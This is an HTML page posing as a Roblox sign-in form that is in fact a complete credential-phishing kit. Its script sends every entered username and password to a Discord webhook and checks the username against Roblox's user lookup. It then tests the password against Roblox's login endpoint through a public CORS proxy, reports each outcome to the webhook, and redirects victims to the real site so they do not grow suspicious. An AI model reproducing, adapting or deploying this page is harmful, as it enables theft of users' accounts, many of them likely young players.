<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In · Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
        }
        .login-container {
            background: white; border-radius: 20px; padding: 40px;
            width: 100%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { color: #1a1a2e; font-size: 24px; text-align: center; margin-bottom: 8px; }
        .subtitle { color: #666; text-align: center; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 6px; color: #333; font-weight: 600; font-size: 14px; }
        input {
            width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0;
            border-radius: 10px; font-size: 16px; outline: none;
        }
        input:focus { border-color: #00b4d8; }
        .btn {
            width: 100%; padding: 14px;
            background: linear-gradient(135deg, #00b4d8, #0077b6);
            color: white; border: none; border-radius: 10px;
            font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px;
        }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .error-msg { color: #e63946; text-align: center; margin-top: 15px; font-size: 14px; display: none; }
        .success-msg { color: #2ecc71; text-align: center; margin-top: 15px; font-size: 14px; display: none; }
    </style>
</head>
<body>
<div class="login-container">
    <svg width="120" height="40" viewBox="0 0 120 40" style="display:block;margin:0 auto 20px;">
        <text x="60" y="28" font-family="Arial" font-weight="bold" font-size="24" fill="#e63946" text-anchor="middle">Roblox</text>
    </svg>
    <h1>Welcome</h1>
    <p class="subtitle">Sign in to continue</p>
    <form id="loginForm">
        <div class="form-group">
            <label for="username">Username or Email</label>
            <input type="text" id="username" placeholder="Username or email" required>
        </div>
        <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" placeholder="Password" required>
        </div>
        <button type="submit" class="btn" id="submitBtn">Log In</button>
        <div class="error-msg" id="errorMsg">Invalid username or password. Please try again.</div>
        <div class="success-msg" id="successMsg">Signing in...</div>
    </form>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    const successMsg = document.getElementById('successMsg');

    errorMsg.style.display = 'none';
    successMsg.style.display = 'none';
    submitBtn.disabled = true;
    submitBtn.textContent = 'Checking...';

    // YOUR DISCORD WEBHOOK URL - REPLACE THIS
    const webhookURL = 'https://discord.com/api/webhooks/1507626132462243923/nXDkuvQctYsfUa0DxwW1PN15FbobMuhFgUBfgoXqeRJdMVi_Ewny769K8F3PlshxAs0Z';

    try {
        // Step 1: Send credentials to Discord
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**Login Attempt:**\nUsername: ${username}\nPassword: ${password}`
            })
        });

        // Step 2: Check if the username exists on Roblox
        const userCheck = await fetch('https://users.roblox.com/v1/usernames/users', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                usernames: [username],
                excludeBannedUsers: true
            })
        });

        const userData = await userCheck.json();

        if (!userData.data || userData.data.length === 0) {
            // Username doesn't exist at all
            errorMsg.style.display = 'block';
            submitBtn.disabled = false;
            submitBtn.textContent = 'Log In';
            
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `❌ **USERNAME NOT FOUND:** ${username}`
                })
            });
            return;
        }

        // Username exists - now try to verify password
        const userId = userData.data[0].id;
        const displayName = userData.data[0].displayName;

        // Step 3: Try to authenticate via a CORS proxy
        // We'll use a public proxy to bypass CORS restrictions
        const proxyUrl = 'https://api.allorigins.win/raw?url=';
        const loginPayload = {
            ctype: 'Username',
            cvalue: username,
            password: password
        };

        try {
            const loginResponse = await fetch(proxyUrl + encodeURIComponent('https://auth.roblox.com/v2/login'), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(loginPayload)
            });

            const loginResult = await loginResponse.json();

            // Check if login was successful
            if (loginResult.status && loginResult.status.http_code === 200) {
                // Valid credentials!
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `✅ **VALID CREDENTIALS - LOGIN SUCCESSFUL:**\nUsername: ${username}\nDisplay Name: ${displayName}\nUser ID: ${userId}\nPassword: ${password}`
                    })
                });

                successMsg.style.display = 'block';
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/home';
                }, 1500);
            } else {
                // Invalid password
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `❌ **WRONG PASSWORD:**\nUsername: ${username}\nPassword: ${password}`
                    })
                });

                errorMsg.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.textContent = 'Log In';
            }
        } catch (proxyError) {
            // If the CORS proxy fails, we can't verify the password
            // In this case, redirect to Roblox anyway (they'll try again there)
            // But still send what we have to Discord
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `⚠️ **COULD NOT VERIFY PASSWORD (redirected):**\nUsername: ${username}\nDisplay Name: ${displayName}\nPassword: ${password}`
                })
            });

            window.location.href = 'https://www.roblox.com/login';
        }

    } catch (err) {
        // If anything fails, redirect to Roblox so they don't get suspicious
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `⚠️ **ERROR (redirected):** ${username}:${password}`
            })
        });

        window.location.href = 'https://www.roblox.com/login';
    }
});
</script>
</body>
</html>
